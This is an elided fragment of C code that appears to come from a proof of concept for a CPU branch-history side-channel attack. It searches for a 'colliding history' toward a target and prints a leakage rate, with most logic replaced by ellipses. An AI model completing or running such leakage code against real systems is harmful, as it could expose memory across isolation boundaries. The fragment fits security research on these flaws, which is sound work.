...
int main(int argc, char **argv)
{
    ...
    if (access("/proc/self/mountstats", F_OK) == 0) {
        cfg.fd = open("/proc/self/mountstats", O_RDONLY);
    ...
    cfg.history_second = calloc(sizeof(uint64_t), MAX_HISTORY_SIZE);
    ...
    printf("------------------------------------------------------\n");
    printf("Find a second colliding history for TFP -> target\n");
    printf("------------------------------------------------------\n");

    time_start = time(0);

    find_colliding_history_2stage(&cfg);
    ...
    print_leakage_rate_2stage(&cfg, 50000);
